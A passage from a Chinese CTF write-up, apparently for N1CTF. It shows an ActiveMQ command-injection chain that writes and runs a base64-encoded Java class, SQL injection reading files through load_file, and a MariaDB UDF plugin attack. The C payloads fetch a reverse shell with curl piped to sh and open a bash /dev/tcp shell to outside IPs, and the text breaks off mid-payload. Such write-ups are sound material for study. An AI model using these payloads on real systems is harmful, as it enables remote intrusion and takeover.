ClassPathXmlApplicationContext(&quot;http://127.0.0.1:8877/api/sun.print.&quot;); ExceptionResponse response = new ExceptionResponse(obj); this.wireFormat.marshal(response, this.dataOut); this.dataOut.flush();&#125; 1echo 编译好的class的base64 &gt; /tmp/nmlgb.txt 1&#123;&quot;lpcAllCom&quot;:[&quot;cmd&quot;,&quot;cmd&quot;]&#125; 1yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw= 1&#123;&quot;lpcAllCom&quot;:[&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;,&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;]&#125;  然后 base64 编码，放入 oneway 的路径🤪 经调试，由于一次性不能写那么长的内容，只能曲线救国 分段写入 1 和 2, 然后合并写入 3, 再 base64 解码 (这 nm 是人能搞出来的操作？本来就恶心，还给👴使绊，差不多得了😅😓) 1&#123;&quot;lpcAllCom&quot;:[&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\\n&#x27;|tee /tmp/3&quot;,&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\\n&#x27;|tee /tmp/3&quot;]&#125; 1&#123;&quot;lpcAllCom&quot;:[&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;,&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;]&#125; 1eyJscGNBbGxDb20iOlsiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIiwiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIl19 解码，写出 Main.class java 运行🤔 1java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main 1&#123;&quot;lpcAllCom&quot;:[&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;,&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;]&#125; wcsndm, 本地环境 base64tmd 写不了文件😅,√Ⅷssrf 命令执行也尽恶心人，题目还不给编译，你 tmjava 不用编译是吧😓😅, 手 搓 class 文件是吧. 哦，源赖氏 java11 编译和运行一体化，一个 java 就能搞定，nmsl (那没事了)😊 之后调用 comsume 函数就行，由于 flag 已经写入队列了，读队列就行了.🤣 12345678910111213public static void main(String[] args) throws Exception &#123; Main main = new Main(); main.consume(); &#125;private void consume() throws Exception &#123; ConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://target:61616&quot;); Connection connection = factory.createConnection(); Session subSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = subSession.createQueue(&quot;flagqueue&quot;); MessageConsumer subscriber = subSession.createConsumer(queue); subscriber.setMessageListener(this); connection.start(); &#125; MessageConsumer subscriber = subSession.createConsumer(queue); ：使用 Session 创建一个 MessageConsumer 对象，该对象用于接收队列 flagqueue 上的消息。 一个德拉米，你设计牛魔的√Ⅷ 题呢，纯😅恶心人，复现都不让了👴安宁。还好👴是完美天才的 idol (暴论😡) 注意米线 # ez_maria 好可爱的 lolita🥵🥵, 不知道 n1 都怎么忍住的，是我直接… 狠狠地把这题做出来，虽然也不一定能做出来就是了.😤 上来就告诉你有 SQL 的利用点，不多说，直接狠狠地搞点事. 二话不说，打个绞线 (读个 index.php) 1id=0 union select 1, load_file(&#x27;/var/www/html/index.php&#x27;) # 源码分析 123456789101112131415161718192021&lt;?php//for n1ctf ezmariadb secret cmdif ($_REQUEST[&quot;secret&quot;] === &quot;lolita_love_you_forever&quot;)&#123; header(&quot;Content-Type: text/plain&quot;); echo &quot;\\\\n\\\\n`ps -ef` result\\\\n\\\\n&quot;; system(&quot;ps -ef&quot;); echo &quot;\\\\n\\\\n`ls -l /` result\\\\n\\\\n&quot;; system(&quot;ls -l /&quot;); echo &quot;\\\\n\\\\n`ls -l /var/www/html/` result\\\\n\\\\n&quot;; system(&quot;ls -l /var/www/html/&quot;); echo &quot;\\\\n\\\\n`find /mysql` result\\\\n\\\\n&quot;; system(&quot;find /mysql&quot;); die(&quot;can you get shell?&quot;);&#125;$servername = &quot;127.0.0.1&quot;;$username = &quot;root&quot;;$password = &quot;123456&quot;;$dbn = &quot;ctf&quot;; waf 123if (preg_match(&quot;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is&quot;, $_REQUEST[&quot;id&quot;]))&#123; die(&quot;你就不能绕一下喵&quot;);&#125; 可以看到当 secret=lolita_love_you_forever 时，会爆出一些信息. lolita 真的会爱我吗，我已经单身二十年甚至十九年，lolita 爱我的话，小🚹👩‍🦰也不是不行…(不行，👴永远喜欢栗山未来) 传参，获取一些有用的信息 1mariadbd --skip-grant-tables --secure-file-priv= --datadir=/mysql/data --plugin_dir=/mysql/plugin --user=mysql plugin 目录是 /mysql/plugin , secure-file-priv 是空的，这表示 MySQL 允许从任何位置读取数据文件。 ならば、答えはひとつだ.(bushi) 往 /mysql/plugin 目录写 so 打 udf😊, 虽然 function 被 ban, 但是我们还有 INSTALL # UDF 写 so🤪 写法一: 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;__attribute__((constructor)) void init(int argc, char *argv[]) &#123; system(&quot;curl https://reverse-shell.sh/82.156.5.200:1034 | sh &amp;&quot;);&#125; 写法二：来自 Lolita 的❤ 1234567891011121314151617#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;void lshell()&#123; system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 